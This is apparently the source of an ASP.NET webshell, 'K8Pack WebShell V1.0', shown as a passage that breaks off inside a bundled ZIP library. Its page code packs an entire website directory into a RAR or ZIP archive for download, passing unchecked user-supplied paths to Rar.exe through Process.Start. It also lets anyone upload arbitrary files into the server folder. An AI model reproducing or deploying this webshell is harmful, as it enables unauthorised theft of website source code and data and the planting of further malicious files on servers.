<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ Import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>K8 ASPX整站打包Shell V1.0</title>
    <style type="text/css">
    .K8_Text_Style{font-size: 13px;margin:0px 0px 0px 0px;font-family:Tahoma;color:lime;  background-color:#003300;border:1px solid lime;}
    .K8_Button_Style{font-size: 13px; margin:0px 0px 0px 0px; font-family:Tahoma;background-color:#1E4C25;color:lime;border:1px solid lime;}
    body,td{line-height: 16px; background-color:#003300; color:lime;}
        .style2
        {
        }
        .style3
        {
        }
        .style6
        {
        }

        .style7
        {
            width: 119px;
            height: 26px;
        }
        .style8
        {
            height: 26px;
        }

    a {color:lime;text-decoration: none;}

        .style9
        {
            width: 415px;
        }

        .style10
        {
        }

        .style11
        {
            width: 392px;
        }

    </style>

</head>
<body>
    <form id="form1" runat="server">
    <table align="center" style="width: 589px">
        <tr>
            <td class="style2" colspan="4" 
                
                
                
                
                
                style="text-align: center;line-height: 50px; font-family: 华文彩云; font-size: 40px;">
                K8Pack WebShell V1.0</td>
        </tr>
        <tr>
            <td class="style2" colspan="4" align="center" height="25">
                &nbsp;</td>
        </tr>
        <tr align="center">
            <td class="style6">
                <span id="Label1">K8ShellPath:</span>
            </td>
            <td class="style3" colspan="3">
                <input name="txtshellpath" readonly= "readonly" runat="server" type="text" value="" id="txtshellpath" class="K8_Text_Style" style="width:500px;" />
            </td>
        </tr>
        <tr>
            <td class="style7">
                <span id="Label2">WinRarPath:</span>
            </td>
            <td class="style8" colspan="3">
                <input name="txtRarPath" id="txtRarPath" type="text" runat="server" 
                    value="C:\Program Files\WinRAR\Rar.exe" class="K8_Text_Style" 
                    style="width:500px;" />
            </td>
        </tr>
        <tr>
            <td class="style6">
                <span id="Label3" runat="server">K8PackPath:</span>
            </td>
            <td class="style3" colspan="3">
                 <input name="txtPackPath" runat="server" type="text" value="" id="txtPackPath" class="K8_Text_Style" style="width:500px;" />
            </td>
        </tr>
        <tr>
            <td class="style6">
                <span id="Label4">OutRarPath:</span>
            </td>
            <td class="style11">
                <input name="txtOutPath" readonly="readonly " runat="server" type="text" 
                    value="" id="txtOutPath" class="K8_Text_Style" style="width:380px;" />
            </td>
            <td class="style9">
                <asp:Button ID="btnK8PackRar" runat="server" Text="RarPack" 
                    CssClass="K8_Button_Style" Width="55px" BorderColor="Lime" Height="20px" 
                    onclick="btnK8PackRar_Click" EnableViewState="False"/>
            </td>
            <td class="style3">
                    
            <asp:Button ID="btn_k8zippack" runat="server" Text="zipPack" 
                    CssClass="K8_Button_Style" Width="55px" BorderColor="Lime" Height="20px" 
                    onclick="btn_k8zippack_Click" EnableViewState="False"/>
                    
            </td>
        </tr>
        <tr>
        <td class="style6">
                <span id="Span1">UpFilePath:</span>
            </td>
            <td class="style10" colspan="3">
                <asp:FileUpload ID="k8upload" runat="server" ToolTip="K8文件上传" Width="212px" 
                    CssClass="K8_Button_Style" ondatabinding="btnk8upload_Click" 
                    BorderStyle="Solid" />
            <asp:Button ID="btnk8upload" runat="server" Text="Upload" 
                    CssClass="K8_Button_Style" Width="55px" BorderColor="Lime" Height="20px" 
                    onclick="btnk8upload_Click" EnableViewState="False"/>
                    
                <asp:Label ID="lbStaus" runat="server">可选用自带ZIP类或调用WinRar</asp:Label>
                    
            </td>
        </tr>
        <tr>
            <td class="style6" colspan="4">
                &nbsp;</td>
        </tr>
        <tr>
            <td class="style6" colspan="4" height="30" 
                style="width: 588px; height: 16px; background-color: #1E4C21;" 
                align="center">
                
                <a href="http://qqhack8.blog.163.com" target="_blank">Copyright © 2011-06-10 CracK8编程小组[K.8] QQ吻 All Rights Reserved</a></td>
        </tr>
        </table>
    </form>
</body>
</html>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        DateTime k8currentime = new DateTime();
        k8currentime = DateTime.Now;
        String k8time = k8currentime.Date.ToShortDateString() + "_" + k8currentime.Hour.ToString() + "_" + k8currentime.Minute.ToString() + "_" + k8currentime.Second.ToString();
        txtshellpath.Value = Server.MapPath(".");
        txtOutPath.Value = Server.MapPath(".") + "\\K8webPack_" + k8time;
    }
    protected void btnK8PackRar_Click(object sender, EventArgs e)
    {
        try
        {
            if (File.Exists(txtRarPath.Value))
            {
                if (txtPackPath.Value == "")
                {
                    txtPackPath.Value = Server.MapPath(".");
                    lbStaus.Text = "即将用Rar打包Shell目录！";
                }
                else if (Directory.Exists(txtPackPath.Value))
                {
                    Process p1 = Process.Start("\"" + txtRarPath.Value + "\"", " a -y -k -m5 -ep1 -o+ -s \"" + txtOutPath.Value + ".Rar\" \"" + txtPackPath.Value + "\"");
                    p1.WaitForExit();
                    if (p1.ExitCode==0)
                        lbStaus.Text = "调用WinRar打包整站完毕！";
                }
                else
                {
                    lbStaus.Text = "打包目录错误或没执行权限！";
                }
            }
            else
            {
                lbStaus.Text = "Rar.exe 路径错误或没权限！";
            }
        }
        catch (Exception k81)
        {
            lbStaus.Text = k81.Message;
        }
    }
    protected void btnk8upload_Click(object sender, EventArgs e)
    {
        try
        {
            if (k8upload.HasFile)
            {
                k8upload.SaveAs(txtshellpath.Value + "\\" + k8upload.FileName);
                lbStaus.Text = k8upload.FileName + " 上传成功！";
            }
            else
                lbStaus.Text = " 请选择要上传的文件！";
        }
        catch (Exception k82)
        {
            lbStaus.Text = k82.Message;
        }
    }

    protected void btn_k8zippack_Click(object sender, EventArgs e)
    {
        try
        {
            if (txtPackPath.Value == "")
            {
                txtPackPath.Value = Server.MapPath(".");
                lbStaus.Text = "即将用ZIP类打包Shell目录！";
            }
            else if (Directory.Exists(txtPackPath.Value))
            {
                ZipFile zip = new ZipFile(this.txtOutPath.Value+".zip");
                zip.AddDirectory(txtPackPath.Value);
                zip.Save();
                lbStaus.Text = "用自带Zip类打包整站完毕！";
            }
        }
        catch (Exception k83)
        {
            lbStaus.Text = k83.Message;
        }
    }
    

    class Shared
    {
        protected internal static string StringFromBuffer(byte[] buf, int start, int maxlength)
        {
            int i;
            char[] c = new char[maxlength];
            for (i = 0; (i < maxlength) && (i < buf.Length) && (buf[i] != 0); i++)
            {
                c[i] = (char)buf[i]; // System.BitConverter.ToChar(buf, start+i*2);
            }
            string s = new System.String(c, 0, i);
            return s;
        }

        protected internal static int ReadSignature(System.IO.Stream s)
        {
            int n = 0;
            byte[] sig = new byte[4];
            n = s.Read(sig, 0, sig.Length);
            if (n != sig.Length) throw new Exception("Could not read signature - no data!");
            int signature = (((sig[3] * 256 + sig[2]) * 256) + sig[1]) * 256 + sig[0];
            return signature;
        }

        protected internal static long FindSignature(System.IO.Stream s, int SignatureToFind)
        {
            long startingPosition = s.Position;

            int BATCH_SIZE = 1024;
            byte[] targetBytes = new byte[4];
            targetBytes[0] = (byte)(SignatureToFind >> 24);
            targetBytes[1] = (byte)((SignatureToFind & 0x00FF0000) >> 16);
            targetBytes[2] = (byte)((SignatureToFind & 0x0000FF00) >> 8);
            targetBytes[3] = (byte)(SignatureToFind & 0x000000FF);
            byte[] batch = new byte[BATCH_SIZE];
            int n = 0;
            bool success = false;
            do
            {
                n = s.Read(batch, 0, batch.Length);
                if (n != 0)
                {
                    for (int i = 0; i < n; i++)
                    {
                        if (batch[i] == targetBytes[3])
                        {
                            s.Seek(i - n, System.IO.SeekOrigin.Current);
                            int sig = ReadSignature(s);
                            success = (sig == SignatureToFind);
                            if (!success) s.Seek(-3, System.IO.SeekOrigin.Current);
                            break; // out of for loop
                        }
                    }
                }
                else break;
                if (success) break;
            } while (true);
            if (!success)
            {
                s.Seek(startingPosition, System.IO.SeekOrigin.Begin);
                return -1;  // or throw?
            }

            // subtract 4 for the signature.
            long bytesRead = (s.Position - startingPosition) - 4;
            // number of bytes read, should be the same as compressed size of file            
            return bytesRead;
        }
        protected internal static DateTime PackedToDateTime(Int32 packedDateTime)
        {
            Int16 packedTime = (Int16)(packedDateTime & 0x0000ffff);
            Int16 packedDate = (Int16)((packedDateTime & 0xffff0000) >> 16);

            int year = 1980 + ((packedDate & 0xFE00) >> 9);
            int month = (packedDate & 0x01E0) >> 5;
            int day = packedDate & 0x001F;


            int hour = (packedTime & 0xF800) >> 11;
            int minute = (packedTime & 0x07E0) >> 5;
            int second = packedTime & 0x001F;

            DateTime d = System.DateTime.Now;
            try { d = new System.DateTime(year, month, day, hour, minute, second, 0); }
            catch
            {
                Console.Write("\nInvalid date/time?:\nyear: {0} ", year);
                Console.Write("month: {0} ", month);
                Console.WriteLine("day: {0} ", day);
                Console.WriteLine("HH:MM:SS= {0}:{1}:{2}", hour, minute, second);
            }

            return d;
        }


        protected internal static Int32 DateTimeToPacked(DateTime time)
        {
            UInt16 packedDate = (UInt16)((time.Day & 0x0000001F) | ((time.Month << 5) & 0x000001E0) | (((time.Year - 1980) << 9) & 0x0000FE00));
            UInt16 packedTime = (UInt16)((time.Second & 0x0000001F) | ((time.Minute << 5) & 0x000007E0) | ((time.Hour << 11) & 0x0000F800));
            return (Int32)(((UInt32)(packedDate << 16)) | packedTime);
        }
    }





    public class ZipDirEntry
    {

        internal const int ZipDirEntrySignature = 0x02014b50;

        private bool _Debug = false;

        private ZipDirEntry() { }

        private DateTime _LastModified;
        public DateTime LastModified
        {
            get { return _LastModified; }
        }

        private string _FileName;
        public string FileName
        {
            get { return _FileName; }
        }

        private string _Comment;
        public string Comment
        {
            get { return _Comment; }
        }

        private Int16 _VersionMadeBy;
        public Int16 VersionMadeBy
        {
            get { return _VersionMadeBy; }
        }

        private Int16 _VersionNeeded;
        public Int16 VersionNeeded
        {
            get { return _VersionNeeded; }
        }

        private Int16 _CompressionMethod;
        public Int16 CompressionMethod
        {
            get { return _CompressionMethod; }
        }

        private Int32 _CompressedSize;
        public Int32 CompressedSize
        {
            get { return _CompressedSize; }
        }

        private Int32 _UncompressedSize;
        public Int32 UncompressedSize
        {
            get { return _UncompressedSize; }
        }

        public Double CompressionRatio
        {
            get
            {
                return 100 * (1.0 - (1.0 * CompressedSize) / (1.0 * UncompressedSize));
            }
        }

        private Int16 _BitField;
        private Int32 _LastModDateTime;

        private Int32 _Crc32;
        private byte[] _Extra;

        internal ZipDirEntry(ZipEntry ze) { }


        public static ZipDirEntry Read(System.IO.Stream s)
        {
            return Read(s, false);
        }


        public static ZipDirEntry Read(System.IO.Stream s, bool TurnOnDebug)
        {

            int signature = Shared.ReadSignature(s);
            // return null if this is not a local file header signature
            if (SignatureIsNotValid(signature))
            {
                s.Seek(-4, System.IO.SeekOrigin.Current);
                if (TurnOnDebug) System.Console.WriteLine("  ZipDirEntry::Read(): Bad signature ({0:X8}) at position {1}", signature, s.Position);
                return null;
            }

            byte[] block = new byte[42];
            int n = s.Read(block, 0, block.Length);
            if (n != block.Length) return null;

            int i = 0;
            ZipDirEntry zde = new ZipDirEntry();

            zde._Debug = TurnOnDebug;
            zde._VersionMadeBy = (short)(block[i++] + block[i++] * 256);
            zde._VersionNeeded = (short)(block[i++] + block[i++] * 256);
            zde._BitField = (short)(block[i++] + block[i++] * 256);
            zde._CompressionMethod = (short)(block[i++] + block[i++] * 256);
            zde._LastModDateTime = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
            zde._Crc32 = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
            zde._CompressedSize = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
            zde._UncompressedSize = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;

            zde._LastModified = Shared.PackedToDateTime(zde._LastModDateTime);

            Int16 filenameLength = (short)(block[i++] + block[i++] * 256);
            Int16 extraFieldLength = (short)(block[i++] + block[i++] * 256);
            Int16 commentLength = (short)(block[i++] + block[i++] * 256);
            Int16 diskNumber = (short)(block[i++] + block[i++] * 256);
            Int16 internalFileAttrs = (short)(block[i++] + block[i++] * 256);
            Int32 externalFileAttrs = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
            Int32 Offset = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;

            block = new byte[filenameLength];
            n = s.Read(block, 0, block.Length);
            zde._FileName = Shared.StringFromBuffer(block, 0, block.Length);

            zde._Extra = new byte[extraFieldLength];
            n = s.Read(zde._Extra, 0, zde._Extra.Length);

            block = new byte[commentLength];
            n = s.Read(block, 0, block.Length);
            zde._Comment = Shared.StringFromBuffer(block, 0, block.Length);

            return zde;
        }

        private static bool SignatureIsNotValid(int signature)
        {
            return (signature != ZipDirEntrySignature);
        }

    }

    public class ZipEntry
    {

        private const int ZipEntrySignature = 0x04034b50;
        private const int ZipEntryDataDescriptorSignature = 0x08074b50;

        private bool _Debug = false;

        private DateTime _LastModified;
        public DateTime LastModified
        {
            get { return _LastModified; }
        }

        private string _FileName;
        public string FileName
        {
            get { return _FileName; }
        }

        private Int16 _VersionNeeded;
        public Int16 VersionNeeded
        {
            get { return _VersionNeeded; }
        }

        private Int16 _BitField;
        public Int16 BitField
        {
            get { return _BitField; }
        }

        private Int16 _CompressionMethod;
        public Int16 CompressionMethod
        {
            get { return _CompressionMethod; }
        }

        private Int32 _CompressedSize;
        public Int32 CompressedSize
        {
            get { return _CompressedSize; }
        }

        private Int32 _UncompressedSize;
        public Int32 UncompressedSize
        {
            get { return _UncompressedSize; }
        }

        public Double CompressionRatio
        {
            get
            {
                return 100 * (1.0 - (1.0 * CompressedSize) / (1.0 * UncompressedSize));
            }
        }

        private Int32 _LastModDateTime;
        private Int32 _Crc32;
        private byte[] _Extra;

        private byte[] __filedata;
        private byte[] _FileData
        {
            get
            {
                if (__filedata == null)
                {
                }
                return __filedata;
            }
        }

        private System.IO.MemoryStream _UnderlyingMemoryStream;
        private System.IO.Compression.DeflateStream _CompressedStream;
        private System.IO.Compression.DeflateStream CompressedStream
        {
            get
            {
                if (_CompressedStream == null)
                {
                    _UnderlyingMemoryStream = new System.IO.MemoryStream();
                    bool LeaveUnderlyingStreamOpen = true;
                    _CompressedStream = new System.IO.Compression.DeflateStream(_UnderlyingMemoryStream,
                                                    System.IO.Compression.CompressionMode.Compress,
                                                    LeaveUnderlyingStreamOpen);
                }
                return _CompressedStream;
            }
        }

        private byte[] _header;
        internal byte[] Header
        {
            get
            {
                return _header;
            }
        }

        private int _RelativeOffsetOfHeader;


        private static bool ReadHeader(System.IO.Stream s, ZipEntry ze)
        {
            int signature = Shared.ReadSignature(s);

            // return null if this is not a local file header signature
            if (SignatureIsNotValid(signature))
            {
                s.Seek(-4, System.IO.SeekOrigin.Current);
                if (ze._Debug) System.Console.WriteLine("  ZipEntry::Read(): Bad signature ({0:X8}) at position {1}", signature, s.Position);
                return false;
            }

            byte[] block = new byte[26];
            int n = s.Read(block, 0, block.Length);
            if (n != block.Length) return false;

            int i = 0;
            ze._VersionNeeded = (short)(block[i++] + block[i++] * 256);
            ze._BitField = (short)(block[i++] + block[i++] * 256);
            ze._CompressionMethod = (short)(block[i++] + block[i++] * 256);
            ze._LastModDateTime = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;

            // the PKZIP spec says that if bit 3 is set (0x0008), then the CRC, Compressed size, and uncompressed size
            // come directly after the file data.  The only way to find it is to scan the zip archive for the signature of 
            // the Data Descriptor, and presume that that signature does not appear in the (compressed) data of the compressed file.  

            if ((ze._BitField & 0x0008) != 0x0008)
            {
                ze._Crc32 = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
                ze._CompressedSize = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
                ze._UncompressedSize = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
            }
            else
            {
                // the CRC, compressed size, and uncompressed size are stored later in the stream.
                // here, we advance the pointer.
                i += 12;
            }

            Int16 filenameLength = (short)(block[i++] + block[i++] * 256);
            Int16 extraFieldLength = (short)(block[i++] + block[i++] * 256);

            block = new byte[filenameLength];
            n = s.Read(block, 0, block.Length);
            ze._FileName = Shared.StringFromBuffer(block, 0, block.Length);

            ze._Extra = new byte[extraFieldLength];
            n = s.Read(ze._Extra, 0, ze._Extra.Length);

            // transform the time data into something usable
            ze._LastModified = Shared.PackedToDateTime(ze._LastModDateTime);

            // actually get the compressed size and CRC if necessary
            if ((ze._BitField & 0x0008) == 0x0008)
            {
                long posn = s.Position;
                long SizeOfDataRead = Shared.FindSignature(s, ZipEntryDataDescriptorSignature);
                if (SizeOfDataRead == -1) return false;

                // read 3x 4-byte fields (CRC, Compressed Size, Uncompressed Size)
                block = new byte[12];
                n = s.Read(block, 0, block.Length);
                if (n != 12) return false;
                i = 0;
                ze._Crc32 = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
                ze._CompressedSize = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;
                ze._UncompressedSize = block[i++] + block[i++] * 256 + block[i++] * 256 * 256 + block[i++] * 256 * 256 * 256;

                if (SizeOfDataRead != ze._CompressedSize)
                    throw new Exception("Data format error (bit 3 is set)");

                // seek back to previous position, to read file data
                s.Seek(posn, System.IO.SeekOrigin.Begin);
            }

            return true;
        }


        private static bool SignatureIsNotValid(int signature)
        {
            return (signature != ZipEntrySignature);
        }


        public static ZipEntry Read(System.IO.Stream s)
        {
            return Read(s, false);
        }


        public static ZipEntry Read(System.IO.Stream s, bool TurnOnDebug)
        {
            ZipEntry entry = new ZipEntry();
            entry._Debug = TurnOnDebug;
            if (!ReadHeader(s, entry)) return null;

            entry.__filedata = new byte[entry.CompressedSize];
            int n = s.Read(entry._FileData, 0, entry._FileData.Length);
            if (n != entry._FileData.Length)
            {
                throw new Exception("badly formatted zip file.");
            }
            // finally, seek past the (already read) Data descriptor if necessary
            if ((entry._BitField & 0x0008) == 0x0008)
            {
                s.Seek(16, System.IO.SeekOrigin.Current);
            }
            return entry;
        }



        internal static ZipEntry Create(String filename)
        {
            ZipEntry entry = new ZipEntry();
            entry._FileName = filename;

            entry._LastModified = System.IO.File.GetLastWriteTime(filename);
            if (entry._LastModified.IsDaylightSavingTime())
            {
                System.DateTime AdjustedTime = entry._LastModified - new System.TimeSpan(1, 0, 0);
                entry._LastModDateTime = Shared.DateTimeToPacked(AdjustedTime);
            }
            else
                entry._LastModDateTime = Shared.DateTimeToPacked(entry._LastModified);

            // we don't actually slurp in the file until the caller invokes Write on this entry.

            return entry;
        }



        public void Extract()
        {
            Extract(".");
        }

        public void Extract(System.IO.Stream s)
        {
            Extract(null, s);
        }

        public void Extract(string basedir)
        {
            Extract(basedir, null);
        }


        // pass in either basdir or s, but not both. 
        private void Extract(string basedir, System.IO.Stream s)
        {
            string TargetFile = null;
            if (basedir != null)
            {
                TargetFile = System.IO.Path.Combine(basedir, FileName);

                // check if a directory
                if (FileName.EndsWith("/"))
                {
                    if (!System.IO.Directory.Exists(TargetFile))
                        System.IO.Directory.CreateDirectory(TargetFile);
                    return;
                }
            }
            else if (s != null)
            {
                if (FileName.EndsWith("/"))
                    // extract a directory to streamwriter?  nothing to do!
                    return;
            }
            else throw new Exception("Invalid input.");


            using (System.IO.MemoryStream memstream = new System.IO.MemoryStream(_FileData))
            {

                System.IO.Stream input = null;
                try
                {

                    if (CompressedSize == UncompressedSize)
                    {
                        // the System.IO.Compression.DeflateStream class does not handle uncompressed data.
                        // so if an entry is not compressed, then we just translate the bytes directly.
                        input = memstream;
                    }
                    else
                    {
                        input = new System.IO.Compression.DeflateStream(memstream, System.IO.Compression.CompressionMode.Decompress);
                    }


                    if (TargetFile != null)
                    {
                        // ensure the target path exists
                        if (!System.IO.Directory.Exists(System.IO.Path.GetDirectoryName(TargetFile)))
                        {
                            System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(TargetFile));
                        }
                    }


                    System.IO.Stream output = null;
                    try
                    {
                        if (TargetFile != null)
                            output = new System.IO.FileStream(TargetFile, System.IO.FileMode.CreateNew);
                        else
                            output = s;


                        byte[] bytes = new byte[4096];
                        int n;

                        if (_Debug)
                        {
                            Console.WriteLine("{0}: _FileData.Length= {1}", TargetFile, _FileData.Length);
                            Console.WriteLine("{0}: memstream.Position: {1}", TargetFile, memstream.Position);
                            n = _FileData.Length;
                            if (n > 1000)
                            {
                                n = 500;
                                Console.WriteLine("{0}: truncating dump from {1} to {2} bytes...", TargetFile, _FileData.Length, n);
                            }
                            for (int j = 0; j < n; j += 2)
                            {
                                if ((j > 0) && (j % 40 == 0))
                                    System.Console.WriteLine();
                                System.Console.Write(" {0:X2}", _FileData[j]);
                                if (j + 1 < n)
                                    System.Console.Write("{0:X2}", _FileData[j + 1]);
                            }
                            System.Console.WriteLine("\n");
                        }

                        n = 1; // anything non-zero
                        while (n != 0)
                        {
                            if (_Debug) Console.WriteLine("{0}: about to read...", TargetFile);
                            n = input.Read(bytes, 0, bytes.Length);
                            if (_Debug) Console.WriteLine("{0}: got {1} bytes", TargetFile, n);
                            if (n > 0)
                            {
                                if (_Debug) Console.WriteLine("{0}: about to write...", TargetFile);
                                output.Write(bytes, 0, n);
                            }
                        }
                    }
                    finally
                    {
                        // we only close the output stream if we opened it. 
                        if ((output != null) && (TargetFile != null))
                        {
                            output.Close();
                            output.Dispose();
                        }
                    }

                    if (TargetFile != null)
                    {
                        // We may have to adjust the last modified time to compensate
                        // for differences in how the .NET Base Class Library deals
                        // with daylight saving time (DST) versus how the Windows
                        // filesystem deals with daylight saving time.
                        if (LastModified.IsDaylightSavingTime())
                        {
                            DateTime AdjustedLastModified = LastModified + new System.TimeSpan(1, 0, 0);
                            System.IO.File.SetLastWriteTime(TargetFile, AdjustedLastModified);
                        }
                        else
                            System.IO.File.SetLastWriteTime(TargetFile, LastModified);
                    }

                }
                finally
                {
                    // we cannot use using() here because in some cases we do not want to Dispose the stream
                    if ((input != null) && (input != memstream))
                    {
                        input.Close();
                        input.Dispose();
                    }
                }
            }
        }


        internal void WriteCentralDirectoryEntry(System.IO.Stream s)
        {
            byte[] bytes = new byte[4096];
            int i = 0;
            // signature
            bytes[i++] = (byte)(ZipDirEntry.ZipDirEntrySignature & 0x000000FF);
            bytes[i++] = (byte)((ZipDirEntry.ZipDirEntrySignature & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((ZipDirEntry.ZipDirEntrySignature & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((ZipDirEntry.ZipDirEntrySignature & 0xFF000000) >> 24);

            // Version Made By
            bytes[i++] = Header[4];
            bytes[i++] = Header[5];

            // Version Needed, Bitfield, compression method, lastmod,
            // crc, sizes, filename length and extra field length -
            // are all the same as the local file header. So just copy them
            int j = 0;
            for (j = 0; j < 26; j++)
                bytes[i + j] = Header[4 + j];

            i += j;  // positioned at next available byte

            // File Comment Length
            bytes[i++] = 0;
            bytes[i++] = 0;

            // Disk number start
            bytes[i++] = 0;
            bytes[i++] = 0;

            // internal file attrs
            // TODO: figure out what is required here. 
            bytes[i++] = 1;
            bytes[i++] = 0;

            // external file attrs
            // TODO: figure out what is required here. 
            bytes[i++] = 0x20;
            bytes[i++] = 0;
            bytes[i++] = 0xb6;
            bytes[i++] = 0x81;

            // relative offset of local header (I think this can be zero)
            bytes[i++] = (byte)(_RelativeOffsetOfHeader & 0x000000FF);
            bytes[i++] = (byte)((_RelativeOffsetOfHeader & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((_RelativeOffsetOfHeader & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((_RelativeOffsetOfHeader & 0xFF000000) >> 24);

            if (_Debug) System.Console.WriteLine("\ninserting filename into CDS: (length= {0})", Header.Length - 30);
            // actual filename (starts at offset 34 in header) 
            for (j = 0; j < Header.Length - 30; j++)
            {
                bytes[i + j] = Header[30 + j];
                if (_Debug) System.Console.Write(" {0:X2}", bytes[i + j]);
            }
            if (_Debug) System.Console.WriteLine();
            i += j;

            s.Write(bytes, 0, i);
        }


        private void WriteHeader(System.IO.Stream s, byte[] bytes)
        {
            // write the header info

            int i = 0;
            // signature
            bytes[i++] = (byte)(ZipEntrySignature & 0x000000FF);
            bytes[i++] = (byte)((ZipEntrySignature & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((ZipEntrySignature & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((ZipEntrySignature & 0xFF000000) >> 24);

            // version needed
            Int16 FixedVersionNeeded = 0x14; // from examining existing zip files
            bytes[i++] = (byte)(FixedVersionNeeded & 0x00FF);
            bytes[i++] = (byte)((FixedVersionNeeded & 0xFF00) >> 8);

            // bitfield
            Int16 BitField = 0x00; // from examining existing zip files
            bytes[i++] = (byte)(BitField & 0x00FF);
            bytes[i++] = (byte)((BitField & 0xFF00) >> 8);

            // compression method
            Int16 CompressionMethod = 0x08; // 0x08 = Deflate
            bytes[i++] = (byte)(CompressionMethod & 0x00FF);
            bytes[i++] = (byte)((CompressionMethod & 0xFF00) >> 8);

            // LastMod
            bytes[i++] = (byte)(_LastModDateTime & 0x000000FF);
            bytes[i++] = (byte)((_LastModDateTime & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((_LastModDateTime & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((_LastModDateTime & 0xFF000000) >> 24);

            // CRC32 (Int32)
            CRC32 crc32 = new CRC32();
            UInt32 crc = 0;
            using (System.IO.Stream input = System.IO.File.OpenRead(FileName))
            {
                crc = crc32.GetCrc32AndCopy(input, CompressedStream);
            }
            CompressedStream.Close();  // to get the footer bytes written to the underlying stream

            bytes[i++] = (byte)(crc & 0x000000FF);
            bytes[i++] = (byte)((crc & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((crc & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((crc & 0xFF000000) >> 24);

            // CompressedSize (Int32)
            Int32 isz = (Int32)_UnderlyingMemoryStream.Length;
            UInt32 sz = (UInt32)isz;
            bytes[i++] = (byte)(sz & 0x000000FF);
            bytes[i++] = (byte)((sz & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((sz & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((sz & 0xFF000000) >> 24);

            // UncompressedSize (Int32)
            if (_Debug) System.Console.WriteLine("Uncompressed Size: {0}", crc32.TotalBytesRead);
            bytes[i++] = (byte)(crc32.TotalBytesRead & 0x000000FF);
            bytes[i++] = (byte)((crc32.TotalBytesRead & 0x0000FF00) >> 8);
            bytes[i++] = (byte)((crc32.TotalBytesRead & 0x00FF0000) >> 16);
            bytes[i++] = (byte)((crc32.TotalBytesRead & 0xFF000000) >> 24);

            // filename length (Int16)
            Int16 length = (Int16)FileName.Length;
            bytes[i++] = (byte)(length & 0x00FF);
            bytes[i++] = (byte)((length & 0xFF00) >> 8);

            // extra field length (short)
            Int16 ExtraFieldLength = 0x00;
            bytes[i++] = (byte)(ExtraFieldLength & 0x00FF);
            bytes[i++] = (byte)((ExtraFieldLength & 0xFF00) >> 8);

            // actual filename
            char[] c = FileName.ToCharArray();
            int j = 0;

            if (_Debug)
            {
                System.Console.WriteLine("local header: writing filename, {0} chars", c.Length);
                System.Console.WriteLine("starting offset={0}", i);
            }
            for (j = 0; (j < c.Length) && (i + j < bytes.Length); j++)
            {
                bytes[i + j] = System.BitConverter.GetBytes(c[j])[0];
                if (_Debug) System.Console.Write(" {0:X2}", bytes[i + j]);
            }
            if (_Debug) System.Console.WriteLine();

            i += j;

            // extra field (we always write null in this implementation)
            // ;;

            // remember the file offset of this header
            _RelativeOffsetOfHeader = (int)s.Length;


            if (_Debug)
            {
                System.Console.WriteLine("\nAll header data:");
                for (j = 0; j < i; j++)
                    System.Console.Write(" {0:X2}", bytes[j]);
                System.Console.WriteLine();
            }
            // finally, write the header to the stream
            s.Write(bytes, 0, i);

            // preserve this header data for use with the central directory structure.
            _header = new byte[i];
            if (_Debug) System.Console.WriteLine("preserving header of {0} bytes", _header.Length);
            for (j = 0; j < i; j++)
                _header[j] = bytes[j];

        }


        internal void Write(System.IO.Stream s)
        {
            byte[] bytes = new byte[4096];
            int n;

            // write the header:
            WriteHeader(s, bytes);

            // write the actual file data: 
            _UnderlyingMemoryStream.Position = 0;

            if (_Debug)
            {
                Console.WriteLine("{0}: writing compressed data to zipfile...", FileName);
                Console.WriteLine("{0}: total data length: {1}", FileName, _UnderlyingMemoryStream.Length);
            }
            while ((n = _UnderlyingMemoryStream.Read(bytes, 0, bytes.Length)) != 0)
            {

                if (_Debug)
                {
                    Console.WriteLine("{0}: transferring {1} bytes...", FileName, n);

                    for (int j = 0; j < n; j += 2)
                    {
                        if ((j > 0) && (j % 40 == 0))
                            System.Console.WriteLine();
                        System.Console.Write(" {0:X2}", bytes[j]);
                        if (j + 1 < n)
                            System.Console.Write("{0:X2}", bytes[j + 1]);
                    }
                    System.Console.WriteLine("\n");
                }

                s.Write(bytes, 0, n);
            }

            //_CompressedStream.Close();
            //_CompressedStream= null;
            _UnderlyingMemoryStream.Close();
            _UnderlyingMemoryStream = null;
        }
    }




    public class ZipFile : System.Collections.Generic.IEnumerable<ZipEntry>,
      IDisposable
    {
        private string _name;
        public string Name
        {
            get { return _name; }
        }

        private System.IO.Stream ReadStream
        {
            get
            {
                if (_readstream == null)
                {
                    _readstream = System.IO.File.OpenRead(_name);
                }
                return _readstream;
            }
        }

        private System.IO.FileStream WriteStream
        {
            get
            {
